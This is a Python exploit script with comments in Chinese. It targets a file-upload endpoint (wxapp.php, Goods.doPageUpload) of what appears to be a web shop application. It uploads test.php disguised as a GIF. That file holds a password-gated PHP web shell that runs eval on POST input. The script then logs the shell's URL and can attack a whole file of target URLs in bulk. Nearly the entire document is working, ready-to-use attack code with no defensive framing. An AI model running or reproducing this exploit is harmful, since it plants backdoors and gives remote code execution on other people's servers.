import requests
import time
import re
import argparse
import urllib3
import base64
parser = argparse.ArgumentParser(description='This is the help!')
parser.add_argument('-u','--url', help='单个检测',default='')
parser.add_argument('-f','--file', help='多个检测',default='')
urllib3.disable_warnings()
args = parser.parse_args()
name = '''
   _____ _     _     _             
  / ____| |   (_)   (_)            
 | (___ | |__  _ _____ _   _ _   _ 
  \___ \| '_ \| |_  / | | | | | | |
  ____) | | | | |/ /| | |_| | |_| |
 |_____/|_| |_|_/___|_|\__, |\__,_|
                        __/ |      
                       |___/        
                                                                                                                

'''
print(name)
def poc(url):
	target = url+"/wxapp.php?controller=Goods.doPageUpload"
	headers = {
		'Cache-Control': 'max-age=0',
		'Upgrade-Insecure-Requests': '1',
		'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs',
		'Origin': 'null',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		'Accept-Encoding': 'gzip, deflate',
		'Accept-Language': 'zh-CN,zh;q=0.9',
	}
# 	payload ='''
# Ci0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeThVYUFObVdBZ000QnFCU3MKQ29udGVudC1EaXNwb3Np
# dGlvbjogZm9ybS1kYXRhOyBuYW1lPSJ1cGZpbGUiOyBmaWxlbmFtZT0iVGVzdC5waHAiCkNvbnRl
# bnQtVHlwZTogaW1hZ2UvZ2lmCgo8P3BocCBlY2hvKCdUZXN0Jyk7Pz4KLS0tLS0tV2ViS2l0Rm9y
# bUJvdW5kYXJ5OFVhQU5tV0FnTTRCcUJTcy0tCgk=
# 	'''
	payload ='''
 
------WebKitFormBoundary8UaANmWAgM4BqBSs
Content-Disposition: form-data; name="upfile"; filename="test.php"
Content-Type: image/gif

<?php
if($_GET["pass"] === "pass"){
    @eval($_POST['test']);
}else{
    echo "test";
}
?>
------WebKitFormBoundary8UaANmWAgM4BqBSs--
'''
	# print(payload)
	payload = str(base64.b64encode(payload.encode("utf-8")), "utf-8")
	print("-"*60)
	try:
		r = requests.post(url=target,headers=headers,data=base64.decodebytes(payload.encode('utf-8')).decode(),timeout=8,verify=False)
		match = re.search(r'\"image_o\":\"(.*?)\",',r.text,re.I|re.M)
		s = match[1]
		s = s.replace('\\','')
		print("正在检测："+url)
		print("上传成功请访问："+s)
		with open("target.txt", 'a') as f:
			f.write(s)
			f.write("\n")
	except:
		print("\033[31m[x] 请求失败\033[0m")
	print("-"*60)
def more(file):
	f = open(file,'r')
	for i in f.readlines():
		i = i.strip()
		poc(i)
		print("\n")
if __name__ == '__main__':
	if args.url !="" and args.file =="" :
		poc(args.url)
	if args.url =="" and args.file !="" :
		more(args.file)
